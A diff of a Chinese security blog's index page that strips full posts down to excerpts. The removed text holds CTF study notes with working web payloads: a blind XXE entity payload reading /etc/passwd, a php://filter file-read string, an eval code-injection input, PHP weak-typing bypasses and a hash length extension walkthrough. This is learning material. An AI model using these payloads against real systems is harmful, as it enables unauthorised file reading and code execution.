-<p>之后这个题目涉及到一个使用本地的dtd来盲注xxe的姿势：</p>
-<p>payload</p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE message[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % ISOamso '</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passed"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">	&amp;#x25;eval;</span></span><br><span class="line"><span class="meta">	&amp;#x25;error;</span></span><br><span class="line"><span class="meta">	'&gt;</span></span><br><span class="line"><span class="meta">	%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h2>参考</h2>
-<p><a href="https://zhuanlan.zhihu.com/p/36517036" target="_blank" rel="noopener">CTF学习--web--XXE</a></p>
-<p><a href="https://www.runoob.com/dtd/dtd-entities.html" target="_blank" rel="noopener">菜鸟教程</a></p>
-<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a></p>
-
-          
+          今天做题的时候遇到了一个xxe相关的题目
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/15/xxe学习/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1495,19 +1389,15 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
       
         
           
-            <p>继续配置了一波phpStorm的环境，感觉对这个IDE还有很多可以研究的地方</p>
-<p>在这里可以修改php的路径，我选择了phpStudy的一个php解释器，因为其中安装了Xdebug。</p>
-<p><img src="https://i.loli.net/2019/08/14/YxhUEJqVHXW5DCp.png" alt="quicker_c3090872-33bf-4a8f-b5d3-68673acc6858.png"></p>
-<p>配置apache的环境，选择的是Local or mounted folder,因为服务器就在本地</p>
-<p><img src="https://i.loli.net/2019/08/14/zAnO3qtLGINyM2o.png" alt="quicker_e3e1a13d-6c33-470b-8e0c-af3eadac4ed5.png"></p>
-<p>路由映射</p>
-<p><img src="https://i.loli.net/2019/08/14/oxn2AeKQ5SEz4Pi.png" alt="quicker_3169e9d1-a506-4173-a498-639a1967baf1.png"></p>
-<p>之后就可以在phpStorm写完代码部署到本地的服务器上了</p>
-<p><img src="https://i.loli.net/2019/08/14/IMgBiuJHXYWGL7A.png" alt="quicker_dc68716b-2b4a-4eaa-93a0-648bcc2945af.png"></p>
-<p>也可以debug了</p>
-<p><img src="https://i.loli.net/2019/08/14/4qkMYoi27umAgDn.png" alt="quicker_7d640fb0-6dfa-4c13-a8c1-1c507ef8276c.png"></p>
-
-          
+          继续配置了一波phpStorm的环境，感
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/14/php-storm环境/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1671,8 +1561,15 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
       
         
           
-            
           
+          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/13/PHP-Audit-Labs学习/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1858,45 +1755,15 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
       
         
           
-            <p>继续分析GitHub上的一个代码审计项目</p>
-<h2>challenge-10</h2>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>小tricks：</p>
-<blockquote>
-<p>var_dump('a'==true); 结果为true</p>
-</blockquote>
-<p>var_dump('a' == 0); 结果为true</p>
-<p>所以<code>id</code>输入一个字母就能够使得<code>!$_GET['id']</code>为false，同时<code>$id == 0</code>为true</p>
-<p><code>$data</code>是从一个文件中得到的结果，这时候想到php伪协议，输入<code>a=php://input</code>再post数据就行</p>
-<p><code>eregi(&quot;111&quot;.substr($b, 0, 1), &quot;1114&quot;)</code> 结合后面的<code>substr($b, 0, 1)!=4</code> 要通过<code>substr</code>函数的截断才行</p>
-<p>所以设置<code>$b=%00111111</code>, substr函数会被截断，strlen不会，eregi就能匹配上了。</p>
-<p><img src="https://i.loli.net/2019/08/12/VZnkLDIqdlX2Aio.png" alt="quicker_e3b83968-e46a-44ea-a5b9-ac36e6f8b271.png"></p>
-<p>补充一点php伪协议的知识，参考了LoRexxar师傅的<a href="https://lorexxar.cn/2016/09/14/php-wei/" target="_blank" rel="noopener">文章</a>。</p>
-<p>php中支持的伪协议很多，</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p>
-<p>我们最常用的任意文件读取的payload就是用了<code>php://</code>协议：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=upload.php</span><br></pre></td></tr></table></figure></p>
-<p>针对<code>php://filter</code>，官方文档是这样写的：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称	描述</span><br><span class="line">resource=&lt;要过滤的数据流&gt;	   这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;	       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;	   该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;	       任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure></p>
-<p>在我们的payload中，<code>upload.php</code>就是要过滤的数据流，<code>convert.base64-encode</code>就是要读链的筛选列表</p>
-<p>之所以要base64编码，一般是为了数据传输的方便</p>
-<p>官方文档中能够举了如下栗子：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">'php://output'</span>, <span class="string">'w'</span>);</span><br><span class="line"></span><br><span class="line">stream_filter_append($fp, <span class="string">'convert.base64-encode'</span>);</span><br><span class="line">fwrite($fp, <span class="string">"This is a test.\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$param = <span class="keyword">array</span>(<span class="string">'line-length'</span>=&gt;<span class="number">8</span>, <span class="string">'line-break-chars'</span>=&gt;<span class="string">"\r\n"</span>);</span><br><span class="line">$fp = fopen(<span class="string">'php://output'</span>, <span class="string">'w'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'convert.base64-encode'</span>, STREAM_FILTER_WRITE, $param);</span><br><span class="line">fwrite($fp, <span class="string">"This is a test.\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">'php://output'</span>, <span class="string">'w'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'convert.base64-decode'</span>);</span><br><span class="line">fwrite($fp, <span class="string">"VGhpcyBpcyBhIHRlc3QuCg=="</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>除了base64之外还有其他的一些过滤器，官方文档中有些。</p>
-<h2>challenge-11</h2>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$link = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">''</span>);</span><br><span class="line"><span class="keyword">if</span> (!$link) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect to MySQL: '</span> . mysql_error()); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择数据库</span></span><br><span class="line">$db = mysql_select_db(<span class="string">"test"</span>, $link);</span><br><span class="line"><span class="keyword">if</span>(!$db)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'select db error'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行sql</span></span><br><span class="line">$password = $_GET[<span class="string">'pwd'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE pass = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">$row1 = mysql_fetch_row($result);</span><br><span class="line">var_dump($row1);</span><br><span class="line"></span><br><span class="line">mysql_close($link);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/08/12/5gY7ZHLE9mb6UCo.png" alt="quicker_73b1351a-f0f9-4639-b091-ac37b7838d6f.png"></p>
-<h2>challenge-12</h2>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>字符串直接拼接</p>
-<p><code>?hello=);eval(phpinfo());//</code></p>
-<h2>challenge-13</h2>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</span><br><span class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array($a))&#123;</span><br><span class="line">   is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</span><br><span class="line">	   ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</span><br><span class="line">	   <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</span><br><span class="line">	   $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</span><br><span class="line">	   $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">	   <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">		   $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">	   &#125;</span><br><span class="line">	   $v2=<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c=@$_GET[<span class="string">'cat'</span>];</span><br><span class="line">$d=@$_GET[<span class="string">'dog'</span>];</span><br><span class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</span><br><span class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</span><br><span class="line">	   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">	   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>可能是我对json不是很了解，这里必须都使用双引号才行。</p>
-<p>两个不是弱类型的trick：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(0===false) 为false</span><br><span class="line">var_dump(null===false) 为false</span><br></pre></td></tr></table></figure></p>
-
-          
+          继续分析GitHub上的一个代码审计项目
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/12/php-challenge/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2082,81 +1949,15 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
       
         
           
-            <p>最近看到了好多针对de1ctf ssrfme题目分析，顺便把之前没搞明白的哈希长度扩展攻击写一下</p>
-<p><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">链接</a>这篇文章讲的很仔细了，分析一下文章中的栗子</p>
-<p>师傅给的<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">代码</a></p>
-<h2>md5的过程</h2>
-<ol>
-<li>MD5 padding</li>
-</ol>
-<blockquote>
-<p>如果输入信息的长度(字节)对64求余的结果不等于56，就需要填充使得对64求余的结果等于56。填充的方法是填充一个x80和xx个0。填充完后，信息的长度为N*64+56(字节)，并且最后8个字节用来记录原始输入信息长度</p>
-</blockquote>
-<ol start="2">
-<li>MD5 compress
-这个算法直接到网上找就行</li>
-</ol>
-<p>所以MD5的过程就是：</p>
-<blockquote>
-<p>先进行消息长度的填充(padding)。填充完后，初始化的4个Magic number会和第一个64字节的Message block进行md5 compress压缩算法。压缩算法完成后，会产生新的4个Magic number。这样再进行第二个64字节Message block的md5 compress压缩算法。以此类推……直到压缩到最后64个字节的(Message block + padding)，最后得到的Magic number经过hex转化就是最后的md5 hash值</p>
-</blockquote>
-<p>比如md5('admin'),由于padding之后只有64个字节，所以只进行一轮的md5 compress 得到的密文就是：</p>
-<p><code>21232f297a57a5a743894a0e4a801fc3</code></p>
-<p>我们可以从密文推导出4个magic number：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x292f2321L</span><br><span class="line">B=0xa7a5577aL</span><br><span class="line">C=0xe4a8943L</span><br><span class="line">D=0xc31f804aL</span><br></pre></td></tr></table></figure></p>
-<p>这个关系就是大小端转化一下</p>
-<h2>md5长度扩展的攻击过程</h2>
-<p>知道如下三个值：</p>
-<ol>
-<li>md5(salt+message)的值</li>
-<li>message内容</li>
-<li>salt+message长度</li>
-</ol>
-<p>我们可以根据md5(salt+message)的值逆向出最后的四个magic number</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_magic_number</span><span class="params">(self, md5str)</span>:</span></span><br><span class="line">    self.A = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">0</span>:<span class="number">8</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    self.B = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">8</span>:<span class="number">16</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    self.C = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">16</span>:<span class="number">24</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    self.D = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">24</span>:<span class="number">32</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></p>
-<p>这个四个magic number去和m做一下次的md5 compress</p>
-<h2>再理解一下</h2>
-<p>继续又看了一篇师傅的文章，想要好好梳理一下哈希扩展攻击</p>
-<p>师傅是以sha1算法为例讲解的： sha1的流程如下：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hash0.jpg" alt=""></p>
-<p>sha1算法和md5很相似，也有最初的四个IV，并且是确定的(这是一种很不好的方法但是也是一种无奈的举动)</p>
-<p>一个不足64位的字符串会被padding至64位，并且由于只有一个分组，所以只需要一轮运算即可</p>
-<p>我们在前一次64位padding之后的字符串的基础上加入一些字符，sha1(salt+padding+add_data) 首先这里肯定是要分成两组的，前一组加密后的内容已经知道了，同时产生的新的IV会参与下一次的复杂的数学运算</p>
-<p>而这些IV是能够从第一组的密文中得知的，这就导致下一组加密后的内容实际上我们也可以知道的</p>
-<p>《白帽子讲web安全》上提到，如何利用长度扩展攻击：</p>
-<blockquote>
-<p>LengthExtension 使得可以在原文之后附加任意的值，并计算出新的hash值，最常见的地方就是签名</p>
-</blockquote>
-<ol>
-<li>错误的签名校验算法
-参数连接时没有使用分隔符，本来是<code>?a=1&amp;b=2&amp;c=3</code>在签名算法中简单地变成了<code>a1b2c3</code></li>
-</ol>
-<p>于是攻击者可以伪造参数<code>?a=1b2c3[...padding....]&amp;b=4&amp;c=5</code></p>
-<p>最终在签名算法中连接时变成了<code>a1b2c3[...padding...]b4c5</code></p>
-<ol start="2">
-<li>
-<p>附加任意的参数</p>
-</li>
-<li>
-<p>HPP</p>
-</li>
-</ol>
-<p>最简单的防护就是将secret放置在参数的末尾</p>
-<h2>举例</h2>
-<p>大师傅给的栗子：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$role = $_REQUEST[<span class="string">"role"</span>];</span><br><span class="line">$hash = $_REQUEST[<span class="string">"hash"</span>];</span><br><span class="line">$salt = <span class="string">"meme"</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($hash !== md5($salt.$role))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong!'</span>;     </span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $role == <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong, hash cann\'t be admin'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You are "</span>.$role.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Congradulation!'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>已知role为admin，salt的长度为4，hash值为：<code>c7813629f22b6a7d28a08041db3e80a9</code></p>
-<p>我们可以在<code>role</code>后面附加任意的数据使得第一个if被绕过</p>
-<p>用大师傅的脚本：</p>
-<p><code>python md5pad.py c7813629f22b6a7d28a08041db3e80a9 joychou 9</code></p>
-<p>当然也可以这样：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump                                                                                                                        </span><br><span class="line">Input Signature: c7813629f22b6a7d28a08041db3e80a9</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 9</span><br><span class="line">Input Data to Add: joychou</span><br><span class="line">06cf5a94dcda53659f58c0f411ba0bd8</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00joychou</span><br></pre></td></tr></table></figure></p>
-<p>注意第三次输入的数据长度是包括salt在内的</p>
-<h2>参考</h2>
-<p><a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">深入理解hash长度扩展攻击（sha1为例）</a>
-<a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">Hash Length Extension Attack</a></p>
-
-          
+          最近看到了好多针对de1ctf ssrf
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/12/哈希扩展攻击继续分析/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2320,106 +2121,15 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
       
         
           
-            <p>在freebuf上看到了一篇新的php反序列化的文章，借此继续分析一下php反序列化。</p>
-<p>文章中的代码如下：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 